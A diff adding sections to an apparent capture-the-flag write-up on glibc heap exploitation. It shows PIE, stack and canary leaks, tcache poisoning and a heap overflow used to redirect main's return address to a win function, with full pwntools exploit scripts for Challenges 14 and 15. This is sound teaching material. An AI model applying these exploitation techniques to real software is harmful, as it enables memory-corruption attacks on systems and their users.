@@ -733,9 +733,133 @@ Moreover, we'd need a stack leakage - which can be obtained by performing House 
 
 Finally, we'd utilize arbitrary write primitive (by tcache poisioning) to overwrite `main_ra` into `win`. 
 
-```python
+One caveat of this challenge, is the fact we dont have read primitive via `puts`, hence we won't be able to trivially leak the stack of a chunk's `next` ptr. However, recall we do have PIE leak. This means we can obtain easily a libc leak using `echo`, and from there - a stack leak via `environ`. \
+But do we actually need this? We can write directly to the stack leak, up to 127 bytes. Is the RA close enough? yup - but there's canary. Hence linear stack write won't help us, unless we'd leak its value. 
 
+However, we can leak the canary trivially - as it is a simple offset compared to the leak stack pointer (leaking it off the `fsbase` within `ld` would also be possible, but harder). Notice the canary starts with an LSB of `\x00`, which should stop `echo` from reading. Can be bypassed by setting offset larger by `1`. 
+
+By debugging, we can see the offset of `main_ra` to the `stack_ptr` stands for `0x58` bytes. Moreover, the canary resides `0x10` bytes before `main_ra`. \
+Another simple approach, is to leak the stack pointer using `echo` - recall we've performed tcache poisoning, having the stack pointer stored as the `next` of some chunk. This means that by `echo`ing this chunk with an offset of 0, we should leak the stack value. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+
+    # Leak PIE program addr
+    echo_chunk_size = 0x20
+    malloc(p, 0, echo_chunk_size)
+    free(p, 0)
+    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
+    pie_base = echo(p, 0, 0) - bin_echo_offset
+    assert(pie_base & 0xfff == 0)
+    win_addr = pie_base + p.elf.symbols['win']
+    print(f'win_addr: {hex(win_addr)}')
+    
+    # Leak stack addr
+    alloc_size = 0xa0  # arbitrary size
+    buf = b'A' * 0x30
+    buf += b'B' * 8  # prev_size
+    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
+    malloc(p, 0, alloc_size)
+    stack_scanf(p, buf)
+    stack_free(p)
+    free(p, 0)
+    stack_pointer_leak = echo(p, 0, 0)  # leak the next_ptr of the chunk
+    print(f'stack_pointer_leak: {hex(stack_pointer_leak)}')
+
+    # Overwrite main_ra to win
+    main_ra = stack_pointer_leak + 0x58
+    allocate_chunk_at_addr(p, main_ra, 0x80)  # arbitrary size
+    buf_2 = struct.pack('<Q', win_addr + 5)
+    scanf(p, 3, buf_2)
+    
+    p.sendline(b'quit')
+    p.interactive()
 ```
+
+## Challenge 15
+
+Now there are no stack operations, but only `echo` and `read`. At a first glance, it seems that we can easily obtain PIE program and stack leaks using `echo`. Then, by using the `read` handler we can write into our goal chunk - which would be the return address. \
+However, upon trying to leak the PIE program address, nothing is being printed!
+
+By inspecting the binary closely, we can see that now, **all ptrs within the slots are being nullified upon a `free`**. This means the UAF vuln is actually closed! However, by introducing the `read` handler, notice it doesn't verifies the chunk's size before reading data into the chunk. Hence, this introduces a new vuln - a linear heap overflow. \
+Moreover, since there are no `size` checks within `echo`, we can overcome this in a clever manner. We'd have to make sure we have some allocated chunk within `tcachebin[0x20]`, resides before the allocation that would be made by `echo`. In that case, by simply supplying larger than expected offsets, we can leak the second chunk values using the first chunk. 
+
+My current goal is to fake the `next` member of some chunk, in order to leverage it towards arbitrary write. The idea is simple:
+
+1. Allocate chunk of size `0x30` at slot `0`: `malloc(0, 0x30)`.
+
+2. Another `malloc(1, 0x30)`
+
+3. Another `malloc(2, 0x30)`
+
+4. `free(2)`
+
+5. `free(1)` - Now the head of the tcachebin, having `next` that isn't `NULL`
+
+6. Read `0x30 + 0x10 + write_addr` bytes to slot `0`. That way, we would set the `next` ptr of the second chunk to address of our wish, instead of some legitimate value. Important - while we dont really care for the value of `prev_size`, we do care about the value of `size`. Hence, we'd have to supply it with the original value of `0x41`. 
+
+7. `malloc(3, 0x30)` - would reuse the second chunk, which we've freed
+
+8. `malloc(4, 0x30)` - would be allocated at an arbitrary address we control. Using `read` into it, we obtain arbitrary write primitive. 
+
+Notice that because the `read` can only read up to 127 bytes, we wouldn't like to deal with large chunks, as they would require larger paddings. 
+
+An interesting caveat I've encountered, was when the overwritten chunk was the head of the tcachebin, but there were no other chunks in it (meaning, its `next` was `NULL`, and the amount of total chunks within the bin was `1`). Because of the allocation at `step 3`, size of that bin was decreased to `0`. A libc optimization looks at the size of the bin within the `tcache_perthread_struct` before actually referencing the bin. In case it is `0`, it won't even access the `next` pointer. Hence, my exploit didn't work before adding the allocation of `slot[2]`. 
+
+```python
+def read(p, index, size, buf):
+    p.sendline(b'read')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Size: ')
+    p.sendline(str(size).encode())
+    p.readline()
+    p.send(buf)
+    p.recvuntil(b'quit): ')
+
+def exploit():    
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+
+    # Leak PIE program addr and stack
+    echo_chunk_size = 0x20
+    malloc(p, 0, echo_chunk_size)
+    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
+    pie_base = echo(p, 0, echo_chunk_size + 0x10) - bin_echo_offset
+    assert(pie_base & 0xfff == 0)
+    main_ra = echo(p, 0, echo_chunk_size + 0x18) + 374
+    win_addr = pie_base + p.elf.symbols['win']
+    print(f'win_addr: {hex(win_addr)} main_ra: {hex(main_ra)}')
+
+    # Overwrite main_ra to win
+    chunk_size = 0x30  # doesn't really matters, as long as it is < 0x80 - 0x10
+    malloc(p, 0, chunk_size)
+    malloc(p, 1, chunk_size)
+    malloc(p, 2, chunk_size)
+    free(p, 2)
+    free(p, 1)
+
+    buf = b'B' * chunk_size
+    buf += b'C' * 8  # fake prev_size
+    buf += struct.pack('<Q', chunk_size + 0x11)  # Restore original size
+    buf += struct.pack('<Q', main_ra)  # Fake next
+    read(p, 0, chunk_size + 0x18, buf)
+    malloc(p, 3, chunk_size)  # Reclaim our freed chunk. Now the bin's head points to our goal address!
+    malloc(p, 4, chunk_size)  # Allocated at our goal address :)
+    buf_2 = struct.pack('<Q', win_addr + 5)
+    read(p, 4, len(buf_2), buf_2)  # Overwrite it
+    
+    p.sendline(b'quit')
+    p.interactive()
+```
+
+## Challenge 16
+
+First safe-linking challenge.
+
+
 
 
 [heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
